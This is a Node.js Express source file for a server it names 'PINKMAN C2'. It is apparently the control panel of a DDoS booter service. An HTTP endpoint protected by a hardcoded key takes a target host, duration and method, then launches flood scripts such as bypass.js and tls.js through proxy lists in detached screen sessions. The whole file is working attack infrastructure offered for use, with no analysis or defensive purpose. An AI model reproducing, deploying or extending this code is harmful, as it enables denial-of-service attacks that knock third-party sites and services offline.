const express = require('express');
const app = express();
const port = 8080;

const validKey = "pinkman";

app.get('/api/attack', (req, res) => {
  try {
    const key = req.query.key;  
    const host = req.query.host;
    const port = req.query.port;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (key !== validKey) {
      return res.status(401).send('Key not valid');
    }

    const spawn = require('child_process').spawn;
    let ls;

     if (method === 'HTTPS') {
         ls = spawn('screen', ['-dm', 'node', 'HTTPS.js', host, time, 64, 10, 'proxy.txt']);
     } else if (method === 'PINK') {
         ls = spawn('screen', ['-dm', 'node', 'pink.js', host, time, 64, 10, 'proxy.txt']);
     } else if (method === 'BYPINK') {
         ls = spawn('screen', ['-dm', 'node', 'bypink.js', host, time, 64, 10, 'proxy.txt']);
     } else if (method === 'BYPASS') {
         ls = spawn('screen', ['-dm', 'node', 'bypass.js', host, time, 64, 10, 'proxy.txt']);
     } else if (method === 'GOJO') {
         ls = spawn('screen', ['-dm', 'node', 'gojo.js', host, time, 64, 10, 'proxy.txt']);
     } else if (method === 'MIX') {
         ls = spawn('screen', ['-dm', 'node', 'mix.js', host, 100, time]);
     } else if (method === 'TLS') {
         ls = spawn('screen', ['-dm', 'node', 'tls.js', host, time, 64, 10, 'proxy.txt']);
     } else {
         return res.status(400).send('Invalid method');
     }

    ls.stdout.on('data', (data) => {
      console.log(`stdout: ${data}`);
    });

    ls.stderr.on('data', (data) => {
      console.error(`stderr: ${data}`);
    });

    ls.on('close', (code) => {
      console.log(`Child process exited with code ${code}`);
      if (code === 0) { 
        const html = `
          <html>
            <body>
              <h1>PINKMAN C2</h1>
              <p>Host: ${host}</p>
              <p>Port: ${port}</p>
              <p>Time: ${time}</p>
              <p>Method: ${method}</p>
            </body>
          </html>
        `;
        res.send(html);
      } else {
        console.error('Error during process execution');
        res.status(500).send('Error during process execution');
      }
    });
  } catch (err) {
    console.error(err);
    res.status(500).send('Internal Server Error');
  }
});

app.listen(port, () => {
  console.log(`PINKMAN Started on port ${port}`);
});
